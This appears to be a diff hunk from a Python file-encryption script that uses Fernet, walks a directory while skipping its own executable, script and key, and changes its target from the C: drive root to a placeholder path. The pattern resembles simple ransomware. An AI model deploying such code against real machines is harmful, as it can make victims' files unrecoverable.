@@ -7,9 +7,9 @@ subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
 from cryptography.fernet import Fernet
 
 files = []
-skip_files = ["encrypt.exe", "encrypt.py", "encrypt.key"]
+skip_files = ["encrypt.exe", "encrypt.py", "encrypt.key", "full_script.py"]
 
-os.chdir("C:/")
+os.chdir("<path>") # <-- change path here
 
 for file in os.listdir():
     if file in skip_files:
